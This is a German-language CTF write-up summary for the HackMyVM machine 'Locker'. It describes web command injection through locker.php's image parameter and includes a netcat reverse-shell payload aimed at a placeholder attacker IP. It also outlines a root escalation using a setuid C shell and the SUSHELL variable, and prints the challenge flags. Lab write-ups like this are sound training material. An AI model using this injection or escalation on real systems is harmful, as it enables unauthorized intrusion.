# Locker - HackMyVM (Easy)

![Locker.png](Locker.png)

## Übersicht

*   **VM:** Locker
*   **Plattform:** HackMyVM (https://hackmyvm.eu/machines/machine.php?vm=Locker)
*   **Schwierigkeit:** Easy
*   **Autor der VM:** DarkSpirit
*   **Datum des Writeups:** 6. November 2022
*   **Original-Writeup:** https://alientec1908.github.io/Locker_HackMyVM_Easy/
*   **Autor:** Ben C.

## Kurzbeschreibung

Das Ziel dieser Challenge war es, Root-Rechte auf der Maschine "Locker" zu erlangen. Der initiale Zugriff erfolgte durch Ausnutzung einer Command Injection-Schwachstelle in einem PHP-Skript (`locker.php`) auf dem Webserver. Durch Manipulation eines GET-Parameters (`image`) konnte ein Netcat-Reverse-Shell-Payload ausgeführt werden, was zu einer Shell als Benutzer `www-data` führte. Die finale Rechteausweitung zu Root gelang durch das Hochladen eines kompilierten C-Programms, das `setuid(0)` und `setgid(0)` aufruft, und anschließender Ausnutzung einer unsicheren Handhabung der Umgebungsvariable `SUSHELL` (wahrscheinlich durch die `su`-Binary), um dieses Programm mit Root-Rechten auszuführen.

## Disclaimer / Wichtiger Hinweis

Die in diesem Writeup beschriebenen Techniken und Werkzeuge dienen ausschließlich zu Bildungszwecken im Rahmen von legalen Capture-The-Flag (CTF)-Wettbewerben und Penetrationstests auf Systemen, für die eine ausdrückliche Genehmigung vorliegt. Die Anwendung dieser Methoden auf Systeme ohne Erlaubnis ist illegal. Der Autor übernimmt keine Verantwortung für missbräuchliche Verwendung der hier geteilten Informationen. Handeln Sie stets ethisch und verantwortungsbewusst.

## Verwendete Tools

*   `arp-scan`
*   `nmap`
*   `nikto`
*   `gobuster`
*   `wfuzz`
*   `curl`
*   `nc` (netcat)
*   `find`
*   `vi`
*   `gcc`
*   `wget`
*   `python3 http.server`
*   `export`
*   Standard Linux-Befehle (`ls`, `cat`, `id`, `cd`, `chmod`, etc.)

## Lösungsweg (Zusammenfassung)

Der Angriff auf die Maschine "Locker" gliederte sich in folgende Phasen:

1.  **Reconnaissance & Web Enumeration:**
    *   IP-Adresse des Ziels (192.168.2.112) mit `arp-scan` identifiziert.
    *   `nmap`-Scan offenbarte nur Port 80 (HTTP, Nginx 1.14.2) als offen.
    *   `nikto` meldete fehlende Sicherheitsheader, fand aber keine kritischen Schwachstellen.
    *   `gobuster` fand `index.html`, einige `.jpg`-Dateien und die Datei `locker.php`.
    *   Der Quellcode von `index.html` zeigte einen Link zur `locker.php` mit einem GET-Parameter `image`.
    *   `wfuzz` auf den `image`-Parameter von `locker.php` bestätigte, dass die Werte `1`, `2`, `3` gültig waren.

2.  **Initial Access (RCE via Command Injection als `www-data`):**
    *   Tests mit dem `image`-Parameter von `locker.php` (z.B. `locker.php?image=;`) deuteten auf eine Command Injection-Schwachstelle hin, da der Server verzögert antwortete.
    *   Ein Netcat-Listener wurde auf dem Angreifer-System gestartet (Port 5656).
    *   Ein Netcat-Reverse-Shell-Payload (z.B. `image=;nc -e /bin/bash ANGRIFFS_IP 5656`) wurde über den `image`-Parameter an `locker.php` gesendet.
    *   Eine Reverse Shell als Benutzer `www-data` wurde erfolgreich empfangen.

3.  **Privilege Escalation (von `www-data` zu `root`):**
    *   Als `www-data` wurde die Suche nach SUID-Binaries durchgeführt, die jedoch keine einfachen direkten Eskalationspfade ergab (`sudo` fehlte).
    *   Ein C-Programm (`shell.c`) wurde auf dem Angreifer-System erstellt, das `setgid(0); setuid(0); system("/bin/bash");` aufruft.
    *   Das C-Programm wurde mit `gcc shell.c -o shell` kompiliert.
    *   Die kompilierte `shell`-Datei (umbenannt zu `shellz`) wurde über einen Python-HTTP-Server bereitgestellt und mittels `wget` in das `/tmp`-Verzeichnis des Zielsystems (als `www-data`) heruntergeladen.
    *   Die heruntergeladene Datei `/tmp/shellz` wurde ausführbar gemacht (`chmod +x /tmp/shellz`).
    *   Die Umgebungsvariable `SUSHELL` wurde auf den Pfad der hochgeladenen Shell gesetzt: `export SUSHELL=/tmp/shellz`.
    *   Durch einen (im Log nicht explizit gezeigten, aber implizierten) Aufruf, der diese Umgebungsvariable auswertet (wahrscheinlich `su`), wurde die Datei `/tmp/shellz` mit Root-Rechten ausgeführt.
    *   Die erhaltene Shell hatte Root-Rechte (`uid=0(root)`).
    *   Die User-Flag (`c7d0a8de1e03b25a6f7ed2d91b94dad6`) und Root-Flag (`7140a59e697f44b8a8581cc85df76f4c`) wurden gefunden.

## Wichtige Schwachstellen und Konzepte

*   **Command Injection:** Eine Schwachstelle in `locker.php` erlaubte die Ausführung beliebiger Betriebssystembefehle durch Manipulation des GET-Parameters `image`.
*   **Unsichere Handhabung von Umgebungsvariablen (SUID/SU):** Die Privilegieneskalation nutzte wahrscheinlich aus, dass die `su`-Binary (oder eine ähnliche SUID-Binary) die Umgebungsvariable `SUSHELL` auswertet und die darin angegebene Shell mit erhöhten Rechten startet.
*   **Hochladen und Ausführen von kompiliertem Code:** Ein maßgeschneidertes C-Programm wurde kompiliert, hochgeladen und zur Eskalation verwendet.

## Flags

*   **User Flag (vermutlich `/home/tolocker/user.txt` oder ähnlich, Pfad nicht explizit gezeigt):** `c7d0a8de1e03b25a6f7ed2d91b94dad6`
*   **Root Flag (`/root/root.txt`):** `7140a59e697f44b8a8581cc85df76f4c`

## Tags

`HackMyVM`, `Locker`, `Easy`, `Command Injection`, `Web RCE`, `SUID Exploit`, `Environment Variable Hijacking`, `SUSHELL`, `Nginx`, `Linux`, `Privilege Escalation`
